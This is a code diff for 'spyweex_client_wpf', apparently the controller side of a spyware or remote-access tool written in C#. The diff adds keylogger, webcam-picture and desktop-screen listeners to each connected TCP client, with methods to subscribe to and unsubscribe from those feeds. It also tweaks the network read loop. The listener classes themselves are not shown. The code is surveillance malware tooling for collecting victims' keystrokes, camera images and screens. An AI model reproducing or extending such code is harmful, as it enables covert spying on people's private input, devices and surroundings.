@@ -14,7 +14,9 @@ using System.Reactive.Disposables;
 using System.Reactive.Linq;
 using System.Reactive.Subjects;
 using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
 using System.Windows;
+using spyweex_client_wpf.Subscribers;
 using static spyweex_client_wpf.WxhtpExceptions;
 
 namespace spyweex_client_wpf
@@ -48,6 +50,10 @@ namespace spyweex_client_wpf
         IPEndPoint _keyEndPoint;
 
         ViewModel _viewModel;
+
+        private WebCamPicListener _webCamPicListener;
+        private KeyloggerListener _keyloggerListener;
+        private DesktopScreenListener _desktopScreenListener;
 
         /// <summary>
         /// Verifies if the console is attached or not
@@ -190,15 +196,71 @@ namespace spyweex_client_wpf
             //fs.Close();
             //client.Close();
             #endregion
+
             _tcpClient = tcpClient;
             _viewModel = vm;
             _tcpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
+
             networkStream = _tcpClient.GetStream();
             _refdictionary = dictionary;
+
+            _desktopScreenListener = new DesktopScreenListener();
+            _webCamPicListener = new WebCamPicListener();
+            _keyloggerListener = new KeyloggerListener();
+
             _keyEndPoint = ((IPEndPoint)tcpClient.Client.RemoteEndPoint);
             _asyncTaskExecutor = new AsyncTaskExecutor(this);
             _asyncTaskExecutor.Start();
+
         }
+
+        #region subscribers
+        public void DesktopScreenListenerSubscribe()
+        {
+            _desktopScreenListener.Subscribe(this);
+        }
+
+        public void WebCamPicListenerSubscribe()
+        {
+            _webCamPicListener.Subscribe(this);
+        }
+
+        public void KeyloggerListenerSubscribe()
+        {
+            _keyloggerListener.Subscribe(this);
+        }
+
+        public bool isDesktopScreenListenerSubscribed()
+        {
+            return _desktopScreenListener.isSubscribed;
+        }
+
+        public bool isWebCamPicListenerSubscribed()
+        {
+            return _webCamPicListener.isSubscribed;
+        }
+
+        public bool isKeyloggerListenerSubscribed()
+        {
+            return _keyloggerListener.isSubscribed;
+        }
+
+        public void DesktopScreenListenerUnSubscribe()
+        {
+            _desktopScreenListener.UnsubscribeAsync();
+        }
+
+        public void WebCamPicListenerUnSubscribe()
+        {
+            _webCamPicListener.UnsubscribeAsync();
+        }
+
+        public void KeyloggerListenerUnSubscribe()
+        {
+            _keyloggerListener.UnsubscribeAsync();
+        }
+
+        #endregion
 
         public TcpClient getTcpClient()
         {
@@ -270,7 +332,7 @@ namespace spyweex_client_wpf
 
                 MemoryStream memoryStream = new MemoryStream();
                 byte[] bufferResult = new byte[16];
-                StringBuilder str = new StringBuilder();
+                //StringBuilder str = new StringBuilder();
 
                 try
                 {
@@ -279,8 +341,8 @@ namespace spyweex_client_wpf
                         int bytesRead;
                         try
                         {
-                            bytesRead = await client.networkStream.ReadAsync(bufferResult, 0, bufferResult.Length).WithCancellation(CancelTokenReadAsync);
-                            str.Append(Encoding.ASCII.GetString(bufferResult));
+                            bytesRead = await client.networkStream.ReadAsync(bufferResult, 0, bufferResult.Length);
+                            //str.Append(Encoding.ASCII.GetString(bufferResult));
                             memoryStream.Write(bufferResult, 0, bytesRead);
                             bytesRead = 0;
                             if (client.networkStream.DataAvailable)
@@ -292,7 +354,7 @@ namespace spyweex_client_wpf
                         catch (Exception ex)
                         {
                             client.Close();
-                            MessageBoxResult result = MessageBox.Show("Connection Dropped " + ex);
+                            MessageBoxResult result = MessageBox.Show("Connection {0} Dropped ", client.getTcpClient().Client.RemoteEndPoint.ToString());
                         }
                         //if (bytesRead <= 0)
                         //{
@@ -306,7 +368,7 @@ namespace spyweex_client_wpf
                 }
                 catch (Exception ex)
                 {
-                    Debug.WriteLine("Client Dropped, maybe. " + ex);
+                    Debug.WriteLine("Client Dropped, maybe. \n" + ex);
                     Stop();
                 }
             }
